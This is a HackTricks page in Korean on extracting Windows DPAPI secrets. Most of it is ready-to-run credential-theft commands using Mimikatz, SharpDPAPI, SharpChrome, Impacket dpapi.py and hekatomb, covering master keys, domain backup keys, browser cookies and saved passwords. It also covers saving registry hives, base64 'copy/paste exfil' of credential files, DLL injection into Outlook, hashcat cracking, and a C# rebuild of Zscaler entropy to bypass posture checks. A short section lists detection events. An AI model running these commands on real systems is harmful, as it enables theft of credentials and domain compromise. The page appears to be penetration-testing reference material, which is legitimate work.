# DPAPI - Password 추출

{{#include ../../banners/hacktricks-training.md}}



## DPAPI란

Data Protection API(DPAPI)는 주로 Windows 운영 체제에서 **asymmetric private keys의 symmetric encryption**에 사용되며, user 또는 system secret을 중요한 entropy 소스로 활용합니다. 이 방식은 user의 logon secret 또는 system encryption의 경우 system의 domain authentication secret에서 파생된 key를 사용해 데이터를 암호화할 수 있도록 하여 개발자의 암호화를 단순화합니다. 따라서 개발자가 encryption key 자체의 보호를 관리할 필요가 없습니다.

DPAPI를 사용하는 가장 일반적인 방법은 **`CryptProtectData` 및 `CryptUnprotectData`** 함수를 이용하는 것입니다. 이 함수들은 현재 로그온된 process의 session을 사용해 데이터를 안전하게 암호화하고 복호화할 수 있게 합니다. 즉, 암호화된 데이터는 이를 암호화한 동일한 user 또는 system만 복호화할 수 있습니다.

또한 이러한 함수는 **`entropy` parameter**도 허용하며, 이 값은 암호화와 복호화 과정에서 함께 사용됩니다. 따라서 이 parameter를 사용해 암호화된 데이터를 복호화하려면 암호화 시 사용된 것과 동일한 entropy 값을 제공해야 합니다.

### Users key generation

DPAPI는 각 user의 credentials를 기반으로 고유한 key( **`pre-key`**라고 함)를 생성합니다. 이 key는 user의 password 및 기타 요소에서 파생되며, algorithm은 user 유형에 따라 달라지지만 최종적으로 SHA1이 됩니다. 예를 들어 domain user의 경우 **user의 NTLM hash에 따라 달라집니다**.

이는 특히 중요한데, attacker가 user의 password hash를 획득할 수 있다면 다음을 수행할 수 있기 때문입니다.

- 해당 user의 key를 사용해 **DPAPI로 암호화된 모든 데이터를 복호화**하며 API에 연결할 필요가 없습니다.
- 유효한 DPAPI key 생성을 시도하면서 offline에서 **password를 crack**할 수 있습니다.

또한 user가 DPAPI를 사용해 데이터를 암호화할 때마다 새로운 **master key**가 생성됩니다. 이 master key가 실제로 데이터를 암호화하는 데 사용됩니다. 각 master key에는 이를 식별하는 **GUID**(Globally Unique Identifier)가 부여됩니다.

Master key는 **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** directory에 저장되며, 여기서 `{SID}`는 해당 user의 Security Identifier입니다. Master key는 user의 **`pre-key`**로 암호화되고, recovery를 위해 **domain backup key**로도 암호화됩니다(따라서 동일한 key가 서로 다른 2개의 pass를 사용해 2번 암호화된 상태로 저장됩니다).

**Master key를 암호화하는 데 사용되는 domain key는 domain controller에 있으며 절대 변경되지 않는다**는 점에 유의해야 합니다. 따라서 attacker가 domain controller에 access할 수 있다면 domain backup key를 가져와 domain 내 모든 user의 master key를 복호화할 수 있습니다.<sup>[[2]](#references)</sup>

암호화된 blob의 header에는 내부 데이터를 암호화하는 데 사용된 **master key의 GUID**가 포함됩니다.

> [!TIP]
> DPAPI encrypted blob은 **`01 00 00 00`**으로 시작합니다.

Master key 찾기:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
다음은 한 사용자의 여러 Master Keys가 보이는 형태입니다:

![What is DPAPI - Users key generation: 한 사용자의 여러 Master Keys가 보이는 형태](<../../images/image (1121).png>)

### Machine/System key generation

이 키는 machine이 데이터를 암호화하는 데 사용됩니다. **DPAPI_SYSTEM LSA secret**을 기반으로 하며, 이는 SYSTEM user만 액세스할 수 있는 특수한 키입니다. 이 키는 machine-level credentials 또는 system-wide secrets와 같이 system 자체에서 액세스해야 하는 데이터를 암호화하는 데 사용됩니다.<sup>[[2]](#references)</sup>

이러한 키에는 **domain backup이 없으므로** 로컬에서만 액세스할 수 있습니다:

- **Mimikatz**는 다음 명령을 사용해 LSA secrets를 dump하여 액세스할 수 있습니다: `mimikatz lsadump::secrets`
- 이 secret은 registry 내부에 저장되므로, administrator는 **액세스할 수 있도록 DACL permissions를 수정할 수 있습니다**. registry path는 다음과 같습니다: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- registry hives에서 offline extraction을 수행하는 것도 가능합니다. 예를 들어, target에서 administrator 권한으로 hives를 저장한 후 exfiltrate합니다:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
그런 다음 analysis box에서 hives로부터 DPAPI_SYSTEM LSA secret을 복구하고 이를 사용해 machine-scope blobs(예약된 작업 암호, service credentials, Wi‑Fi profiles 등)를 decrypt합니다:
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### DPAPI로 보호되는 데이터

DPAPI로 보호되는 개인 데이터는 다음과 같습니다.

- Windows creds
- Internet Explorer 및 Google Chrome의 passwords와 자동 완성 데이터
- Outlook 및 Windows Mail과 같은 애플리케이션의 E-mail 및 내부 FTP account passwords
- 공유 폴더, 리소스, wireless networks 및 Windows Vault의 passwords와 encryption keys
- remote desktop connections, .NET Passport의 passwords 및 다양한 encryption과 authentication 용도의 private keys
- Credential Manager에서 관리하는 network passwords 및 Skype, MSN messenger 등 CryptProtectData를 사용하는 애플리케이션의 개인 데이터
- register 내부의 encrypted blobs
- ...

시스템에서 보호되는 데이터에는 다음이 포함됩니다.
- Wi-Fi passwords
- Scheduled task passwords
- ...

### Master key extraction options

- 사용자가 domain admin privileges를 보유한 경우 **domain backup key**에 액세스하여 도메인의 모든 user master keys를 decrypt할 수 있습니다:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- 로컬 관리자 권한이 있으면 **LSASS 메모리에 액세스**하여 연결된 모든 사용자의 DPAPI 마스터 키와 SYSTEM 키를 추출할 수 있습니다.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- 사용자에게 로컬 관리자 권한이 있는 경우 **DPAPI_SYSTEM LSA secret**에 액세스하여 머신 master keys를 복호화할 수 있습니다:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- 사용자의 password 또는 NTLM hash를 알고 있다면, **사용자의 master keys를 직접 decrypt할 수 있습니다**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- 사용자의 session 내부에 있다면 **RPC를 사용해 master keys를 decrypt할 backup key를 DC에 요청**할 수 있습니다. local admin이고 사용자가 로그인한 상태라면 이를 위해 **사용자의 session token을 steal**할 수 있습니다:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vault 목록
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI 암호화 데이터 액세스

### DPAPI 암호화 데이터 찾기

일반 사용자 **보호된 파일**은 다음 위치에 있습니다:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 위 경로에서 `\Roaming\`을 `\Local\`로 변경한 경로도 확인합니다.

열거 예시:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)는 파일 시스템, 레지스트리 및 B64 blobs에서 DPAPI로 암호화된 blobs를 찾을 수 있습니다:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
참고로 (동일한 repo의) [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI)를 사용하면 cookies와 같은 DPAPI로 암호화된 민감한 데이터를 decrypt할 수 있습니다.

#### Chromium/Edge/Electron quick recipes (SharpChrome)

- 현재 user, saved logins/cookies의 interactive decryption (user context에서 실행할 때 사용자의 Credential Manager에서 추가 키가 resolve되므로 Chrome 127+의 app-bound cookies에서도 작동):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- 파일만 가지고 있는 경우의 Offline analysis. 먼저 프로필의 "Local State"에서 AES state key를 추출한 다음 이를 사용하여 cookie DB를 decrypt합니다:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- DPAPI domain backup key (PVK)와 대상 호스트의 admin 권한이 있는 경우 도메인 전체/원격 triage:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- 사용자의 DPAPI prekey/credkey(LSASS에서 가져온 것)가 있다면 password cracking을 건너뛰고 프로필 데이터를 직접 decrypt할 수 있습니다:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Notes
- 최신 Chrome/Edge 빌드는 특정 cookies를 "App-Bound" encryption으로 저장할 수 있습니다. 추가 app-bound key 없이는 해당 cookies를 offline decryption할 수 없습니다. 대상 user context에서 SharpChrome을 실행하면 해당 key를 자동으로 가져옵니다. 아래에 참조된 Chrome security blog post를 확인하세요.<sup>[[5]](#references)</sup>

### Access keys and data

- **SharpDPAPI를 사용하여** 현재 session의 DPAPI encrypted files에서 credentials를 가져옵니다:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **자격 증명 정보 획득**: 암호화된 데이터와 guidMasterKey 등.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

RPC를 사용하여 **domain backup key**를 요청하는 사용자의 masterkey를 Decrypt합니다:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** tool은 masterkey decryption을 위해 다음 arguments도 지원합니다(`/rpc`를 사용해 domain backup key를 가져오거나, `/password`를 사용해 plaintext password를 지정하거나, `/pvk`를 사용해 DPAPI domain private key file을 지정할 수 있다는 점에 유의하세요...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **masterkey를 사용하여 데이터 복호화**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
**SharpDPAPI** tool은 `credentials|vaults|rdg|keepass|triage|blob|ps` 복호화에 다음 arguments도 지원합니다(`/rpc`를 사용해 도메인 백업 키를 가져오고, `/password`를 사용해 plaintext password를 지정하며, `/pvk`를 사용해 DPAPI 도메인 private key 파일을 지정하고, `/unprotect`를 사용해 현재 사용자의 session을 사용하는 것이 가능함에 유의):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- DPAPI prekey/credkey를 직접 사용 (비밀번호 불필요)

LSASS를 dump할 수 있다면 Mimikatz는 종종 plaintext 비밀번호를 몰라도 사용자의 masterkey를 decrypt하는 데 사용할 수 있는 logon별 DPAPI key를 노출합니다. 이 값을 tooling에 직접 전달합니다:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- **현재 사용자 세션**을 사용하여 일부 데이터를 복호화:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Impacket dpapi.py를 사용한 Offline decryption

피해자 사용자의 SID와 password(또는 NT hash)가 있다면 Impacket의 dpapi.py를 사용하여 DPAPI masterkeys와 Credential Manager blobs를 완전히 offline에서 decrypt할 수 있습니다.<sup>[[10]](#references)[[11]](#references)</sup>

- 디스크에서 artefacts 식별:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- 일치하는 masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- file transfer tooling이 불안정한 경우, 호스트에서 파일을 base64로 인코딩한 후 출력을 복사합니다:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- 사용자의 SID와 password/hash로 masterkey를 복호화합니다:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- 복호화된 masterkey를 사용하여 credential blob을 복호화합니다:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
이 workflow는 Windows Credential Manager를 사용하는 앱에 저장된 domain credentials를 자주 복구하며, administrative accounts(예: `*_adm`)도 포함됩니다.

---

### Optional Entropy("Third-party entropy") 처리

일부 애플리케이션은 `CryptProtectData`에 추가 **entropy** 값을 전달합니다. 이 값이 없으면 올바른 masterkey를 알고 있더라도 blob을 decrypt할 수 없습니다. 따라서 이러한 방식으로 보호된 credentials(예: Microsoft Outlook 및 일부 VPN clients)를 대상으로 할 때는 entropy를 확보하는 것이 필수적입니다.

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture)(2022)는 target process 내부의 DPAPI functions를 hook하고 전달되는 optional entropy를 투명하게 기록하는 user-mode DLL입니다. `outlook.exe` 또는 `vpnclient.exe`와 같은 processes에 대해 **DLL-injection** mode로 EntropyCapture를 실행하면 각 entropy buffer를 호출한 process 및 blob에 매핑하는 file이 출력됩니다. 캡처한 entropy는 이후 **SharpDPAPI**(`/entropy:`) 또는 **Mimikatz**(`/entropy:<file>`)에 제공하여 data를 decrypt하는 데 사용할 수 있습니다.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### masterkeys offline Cracking (Hashcat & DPAPISnoop)

Microsoft는 Windows 10 v1607 (2016)부터 **context 3** masterkey 형식을 도입했습니다. `hashcat` v6.2.6 (2023년 12월)에는 hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1), **22102** (context 3)가 추가되어 masterkey 파일에서 직접 사용자 비밀번호를 GPU-accelerated 방식으로 Cracking할 수 있습니다. 따라서 Attackers는 target system과 상호작용하지 않고 word-list 또는 brute-force attacks를 수행할 수 있습니다.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024)은 이 과정을 자동화합니다:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
이 도구는 Credential 및 Vault blobs를 parse하고, cracked keys로 decrypt한 후 cleartext passwords를 export할 수도 있습니다.<sup>[[8]](#references)</sup>


### 다른 machine 데이터에 액세스

**SharpDPAPI 및 SharpChrome**에서는 **`/server:HOST`** 옵션을 지정하여 remote machine의 데이터에 액세스할 수 있습니다. 물론 해당 machine에 액세스할 수 있어야 하며, 다음 예제에서는 **domain backup encryption key가 알려져 있다**고 가정합니다:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## 기타 도구

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB)는 LDAP directory에서 모든 사용자와 컴퓨터를 자동으로 추출하고 RPC를 통해 domain controller backup key를 추출하는 tool입니다. 그런 다음 script는 모든 컴퓨터의 IP address를 확인하고 모든 컴퓨터에서 smbclient를 수행하여 모든 사용자의 DPAPI blob을 가져온 후 domain backup key로 모든 항목을 decrypt합니다.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP에서 추출한 컴퓨터 목록을 사용하면 미리 알지 못했던 sub network도 모두 찾을 수 있습니다!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI)는 DPAPI로 보호된 secret을 자동으로 dump할 수 있습니다. 2.x release에서는 다음 기능이 도입되었습니다:<sup>[[9]](#references)</sup>

* 수백 개 host에서 blob 병렬 수집
* **context 3** masterkey parsing 및 자동 Hashcat cracking integration
* Chrome "App-Bound" encrypted cookie 지원 (다음 section 참조)
* 새 **`--snapshot`** mode를 사용한 endpoint 반복 polling 및 새로 생성된 blob diff

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop)는 masterkey/credential/vault file을 parsing하여 Hashcat/JtR format으로 출력하고, 선택적으로 cracking을 자동 실행할 수 있는 C# parser입니다. Windows 11 24H1까지의 machine 및 user masterkey format을 완전히 지원합니다.<sup>[[8]](#references)</sup>


## 일반적인 탐지 항목

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` 및 기타 DPAPI 관련 directory의 file에 대한 access.
- 특히 **C$** 또는 **ADMIN$**와 같은 network share를 통한 access.
- **Mimikatz**, **SharpDPAPI** 또는 이와 유사한 tooling을 사용하여 LSASS memory에 access하거나 masterkey를 dump하는 행위.
- Event **4662**: *An operation was performed on an object* - **`BCKUPKEY`** object에 대한 access와 연관 지을 수 있습니다.
- process가 *SeTrustedCredManAccessPrivilege* (Credential Manager)를 요청할 때의 Event **4673/4674**

---
### 2023-2025 vulnerabilities 및 ecosystem changes

* **CVE-2023-36004 - Windows DPAPI Secure Channel Spoofing** (2023년 11월). Network access 권한이 있는 attacker는 domain member가 malicious DPAPI backup key를 가져오도록 속일 수 있으며, 이를 통해 user masterkey를 decrypt할 수 있습니다. 2023년 11월 cumulative update에서 patch되었으므로 administrators는 DC와 workstation이 완전히 patch되었는지 확인해야 합니다.<sup>[[4]](#references)</sup>
* **Chrome 127 "App-Bound" cookie encryption** (2024년 7월)은 legacy DPAPI-only protection을 user의 **Credential Manager**에 저장되는 additional key로 대체했습니다. 이제 cookie의 offline decryption에는 DPAPI masterkey와 **GCM-wrapped app-bound key**가 모두 필요합니다. SharpChrome v2.3 및 DonPAPI 2.x는 user context로 실행할 때 additional key를 recover할 수 있습니다.<sup>[[5]](#references)</sup>


### Case Study: Zscaler Client Connector - SID에서 파생된 Custom Entropy

Zscaler Client Connector는 `C:\ProgramData\Zscaler` 아래에 여러 configuration file(예: `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`)을 저장합니다. 각 file은 **DPAPI (Machine scope)**로 encrypt되지만 vendor는 disk에 저장하지 않고 *runtime에 계산되는* **custom entropy**를 제공합니다.<sup>[[1]](#references)</sup>

entropy는 두 요소로부터 재구성됩니다.

1. `ZSACredentialProvider.dll` 내부에 embedded된 hard-coded secret.
2. configuration이 속한 Windows account의 **SID**.

DLL에 구현된 algorithm은 다음과 동일합니다.
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
secret이 디스크에서 읽을 수 있는 DLL에 포함되어 있으므로, **SYSTEM 권한을 가진 모든 local attacker는 모든 SID에 대한 entropy를 재생성하고 blob을 offline에서 decrypt할 수 있습니다:**
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
복호화하면 모든 **device posture check**와 해당 예상 값을 포함한 전체 JSON configuration이 생성됩니다. 이는 client-side bypass를 시도할 때 매우 중요한 정보입니다.

> TIP: 기타 암호화된 artefact(`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`)는 **entropy 없이**(`16`개의 0 바이트) DPAPI로 보호됩니다. 따라서 SYSTEM privileges를 획득하면 `ProtectedData.Unprotect`를 사용해 직접 복호화할 수 있습니다.

## References

- [1] [Synacktiv - zero trust를 신뢰해야 하는가? Zscaler posture checks 우회](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. DPAPI의 보안 분석 및 데이터 복구](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Mimikatz 및 C++를 사용한 DPAPI Encrypted Secrets 읽기](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Windows에서 Chrome cookies의 보안 개선](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: DPAPI Optional Entropy의 간단한 추출](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 release notes](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop - GitHub repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 - PyPI project page](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket - dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, 그리고 DC admin으로의 DPAPI decryption](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome - Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
